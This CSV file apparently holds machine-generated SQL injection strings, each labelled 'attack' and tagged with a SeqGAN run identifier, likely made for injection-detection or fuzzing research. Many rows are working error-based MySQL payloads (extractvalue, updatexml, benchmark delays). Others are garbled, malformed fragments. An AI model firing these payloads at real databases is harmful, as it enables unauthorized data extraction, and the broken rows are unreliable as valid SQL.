attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'zyn      0x717a767a71,updatexml  (  (  (  (  5000000,(  (  (  0x5c,0x7171706a71(  (  (  (  5000000,m(  (  (  (  (  benchmark  (  (  (  5000000(  (   (  (  7982,  (  =  (  3393,concat  (  (  (  (  (  (  (  (  6581  =  ut  (  7982  =  (  (  0x2e,0x7171706a71,  (  select   (  elta  elt  (  e  7982  =  (  (  0x5c,  (  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,472
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,473
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,474
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,475
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ysmw'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,476
attack,"1%'   ,updatexml  (  (  (  7050  (  (  (  7982,concat  (  =  (  (  (  (  (  (  0x5c,0x7171706a71,  (  (  5000000(  (  (  0x2e,0x7171706a71,  (  5000000(  (  (  3393  (  (  (  0x5c,  (  (  select   (  (  elt  (  5000000,md5  (  t  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  0x5c,  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,477
attack,"1%"" and updatexml  (  (  (   (  (  6200  )   (  5423  =  (  9627,mduant  )  (  select   (  elt  (  elt  (  5000000,md5  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  =  (  (    (  9255,concat  (  0x2e,concat  (  (  (  7982  =  (  3393,  (  5000000(  (  0x5c,md5  (  (  0x2e,  (  1151  (  (  (  select   (  elt  (  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,478
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,479
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,480
attack,"%concat1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,481
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,482
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,483
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,484
attack,"1 and updatexml  (  (  (  (  3393,concat  (  (  (  (  1808,concat  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  e  (  1808  =  1297,md5  (  (  select   (  e  (  elt  (  elt  (  0x5c,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  select   (  case when   (  9667  (  7982  =  3393,1   from dual  )  )  1724  (  2813  (  3393,1   from dual",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,485
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""O5989?' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'x    "" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""dgq6369)    (    AND 'i' 1 and extractvalue  (  (  (  (  (  1808,md5  (  (  1 a  1808,md5  (  (  2917  =  (  (  7982  =    (  (  (  (  select   (  elt  (  e    (  7982,concat  (  0x4b774c75   end  (  (  elt  e  (  0x2e,0x7171706a71,  (  (  t  (  benchmark  (  (  5000000,md5  (  0x2e,  (  select   (  0x2e,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,486
attack,"1 and extractvalue  (  9627,concat  (  0x5c,l_  (  benchmark  (  5000000(  0x2e,md5  (  (  0x2e,md5  (  3393  (  1808,concat  (  3393,  (  0x5c,  (  select   (  6166  =  (  (  1808  =  3393  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  =  (  (  benchmark  (  (  5000000,md5  (  0x2e,1  ,0x717a767a71  (  )  select updatexml  (  (  (  (  (  (  2917,concat  extractvalue  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,487
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,488
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,489
attack,"1,updatexml  (  (  (  3393,concat  (  (  (  0x2e,(  (  (  (  select   (  1354  =  (  (  1759  (  (  (  0x5c,  (  (  (  5000000(  (  (  =  (  (  0x5c,m(  (  (  (  5000000,md5  (  (  0x5c,  (  (  0x5c,  (  (  (  select   (  elt  e  (  select   (  eltl  =  5423  (  1759  (  0x2e,m(  (  (  (  9627,concat  (  (  0x5c",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,490
attack,"1%""   )    (    select   (  case 0x717a767a71   (  2501  (  (  1808  =    (  (  0x5c,0x7171706a71,  (  9627,concat  (  (  (  0x2e,md5  (  (  benchmark  (  (  (  0x2e,md5  (  1297,  (  (  (  select   (  elt  (  3393  =  (  3576  =  (  (  0x5c,  (  (  9627,concat  0x2e,md5  (  =  (  5000000,md5  (  0x2e,0x7171706a71,  (  selectt  (  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,491
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""oc%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,492
attack,"1%"",0x717a767a71   (  7636  (  (  (  (  )  (  1297  =  (  select   (  )  elt  (  1808  =  (  1297,0x7171706a71(  (  select   (  1812  )   end  (  elt  (  elt  (  0x2e,0x7171706a71,  (  (  select   (  l  (  0x5c,0x7171706a71,  (  benchmark  (  5000000(  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  select   (  case 9667   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,493
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,494
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,495
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,496
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,497
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,498
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,499
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,500
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,501
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,502
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'f'  =  'v""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  """"  =  ""c",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,503
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,504
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,505
attack,1%1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,506
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,507
attack,"1%"" or extractvalue  (  5000000(  0x5c,0x7171706a71,  (  (  select   (  elt  (  7982,concat  (  2917  =  9788,  (  (  5000000,md5  (  t  (  (  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  el  (  select   (  elt  (  0x2e,md5  =  (  3393,1   (  )   from d5  (  elt  elt  (  0x52515a50   end  (   (  5423  (  elt  (  elt  (  7982  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,508
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,509
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '"" like ""kzm   (    7757   )    (  extractvalue  (  3393,1   )    u ant  )  ~  (  select 0 from duanal  )   end  ut  (  elt  )  elt  (  1808  =  select   (  )  (  elte  e  (  0x2e,0x7171706a71,  (  (  select   (  3863  )   (  5322  (  (  elt  (  elt  (  e  (  0x4b774c75   (  3863  (  (  1808,concat  (  (  0x5c,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,510
attack,"7997,1 and extractvalue  (  (  (  (  0x2e,0x7171706a71,  (  (  =  (  1297,concat  (  (  (  (  1808select   (  elt  (  1297  (  =  (  3393,concat  (  (  concat  (  0x2e,md5  (  =  (  4774  =  (  (  2917=  (  (  1808,1   (  case when   (  5423  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  benchmark  (  (  9627,concat  (  5322  (  0x2e,md5  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,511
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,512
attack,"1%""   )    )hole  (  7982,1   )    (  select   (  case when   (  7997  (  (  (  0x4b774c75   )    (  (  5000000,md5  (  (  7982,concat  (  (  =  (  (  (  0x2e,md5  (  =  (  (  0x5c,0x7171706a71,  (  (  select   (  e  (  elt  (  1297  )  (  3393,md5  (  (  0x5c,0x7171706a71,  (  select   (  e0x7171706a71)  (  elt  (  0x5c,  (  5000000,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,513
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,514
attack," AND from 0 from dual  )  e  )   (  5433  (  (  elt  (  1297  =  (  5000000,md5  (  (  (  0x2e,0x7171706a71,  (  =  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  (  select   (  el_nal  )  0x4b774c75   (  (  elt  (  (  elt  (  7982  =  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  3393  =  (  (  4125  (  1808  =  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,515
attack,1272,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,516
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,517
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,518
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,519
attack,"1%,pCOCAND       m in minannaddre du   e    (    el  (  1808  =  3393,1   (  (  e(  elt  (  0x5c,0x7171706a71,  (  select   (  elt  elt    (  1808  =  (  3393,  (  =  (  9255,concat  (  (  3393,md5  (  0x5c,0x7171706a71,  (  benchmark  (  (  benchmark  (  (  select   (  elt  (  3393  =  (  (  5989  =  8868  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,520
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,521
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,522
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,523
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,524
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  ""bo'  =  '   2446  )  )   from d5  (  el  (  1808  =  (  7982,1   )    (  extractvalue  (  (  9627,,  (  select   (  elt  (  (  elt  (  0x2e,md5  (  0x52515a50   (  2501  (  (  1759  (  (  =  (  (  1808  =  (  3393,md5  =  (  (  (  7982  =  1   from dual  )  )  )   and  (  (  elt  (  e  (  3393  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,525
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,526
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,527
attack,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,528
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  ""1535",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,529
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,530
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'pkpk'  =  '""  =  ""'a dgsananalyseduse analysenanal  )  7982  =  (  (  0x5c,  (  5000000(  (  (  0x2e,0x7171706a71,  (  t  (  (  benchmark  (  (  5000000(  =  (  1759(  (  1808  =  (  (  0x5c,0x7171706a71,  (  extractvalue  (  (  (  9627,concat  (  (  0x2e,md(  (  select   (  elt  (  0x5c,0x7171706a71,  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,531
attack,"1 or extractvalue  (  (  8862  (  =  (  (  (  (  (  (  5000000(  (  =  (  =  7151  (  3393,1   )    )1  extractvalue  (  (  9627,concat  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  0x2e,md5  (  0x2e,0x7171706a71,  (  (  1759(  (  0x2e,0x7171706a71,  (  (  select   (  2917=  )   (  0 0 from   (  (  elt  )  elt  (  e  (  select   (  case",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,532
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,533
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,534
attack,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'p'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'hgnhz' like 'nhqu"" like ""gknn""  =  "")  DUSW  )    zupdatexml  (  (  (  (  (  (  (  (  (  (  benchmark(  (  ut  (  elt  (  1297,concat  (  0x2e,md5  (  (  select   (  elt  =  7982  =  1 0 from dual  )  )   end  (  (  elt  elt  (  1808  =  (  0x2e,-- AND  =  7757 0 from d dua  elt  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,535
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,536
attack,"1%%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,537
attack,"1%""   )    (  extractvalue  (  9255,concat  (  (  (  (  (  (  (  (  (  =  (  2826   (  8375  (  (  5000000,md5  =  (  9490  =  (  (  (  3393  =  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  0x4b774c75   (  4660  (  (  (  e  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,538
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,539
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,540
attack,"1%,pvf",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,541
attack,"1"" where extractvalue  (  (  (  (  (  (  (  e  (  (  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  0x5c,md5  (  (  1808,concat  (  (  (  (  0x2e,md,  (  (  select   (  (  elt  (  3393  =  (  0x5c,  (  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  e  (  (  (  0x5c,0x7171706a71,  (  select   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,542
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,543
attack,"1' where 0 or and extractvalue  (  (  (  6528  (  (  3393,concat  (  (  =  (  (  1297,concat  (  (  (  updatexml  (   (  (  (  7982  =  (  3393,1   from dualt  elt  e    (  (  0x5c,md5  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  select   (  elta  elt  (  0x2e,0x7171706a71,  (  9627,md5  (  0x5c,  (  (  benchmark  (  5000000  (  (  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,544
attack,"1"" and extractvalue  (  (  (  (  (  0x2e,0x7171706a71,  (    (  select   (  elta  elt  (  7982  =  (  (  1297,concat  (  (  =  (  (  (  0x5c,0x7171706a71,  (  selectelt  (  elt  (  case  =  4688  (  3393,1   )    (  extractvalue  (  9627,md5  (  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  (  (  benchmark  (  (  benchmark  (  (  9627,concat  (  3393  (  0x2e,l",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,545
attack,"1%         k7757      0x717a767a71ro92553217  (  (  7982  =  (  1808,md5    (  (  3393  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  (  (  0x5c,0x7171706a71,  (  (  select 0 0 0 from dual  e  )  elta  )  e(  elt  (  elt  (  7982  =  (  (  9788  (  7982  (  3393,md5  (  (  (  =  (  0x2e,0x7171706a71,  (  (  benchmark  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,546
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,547
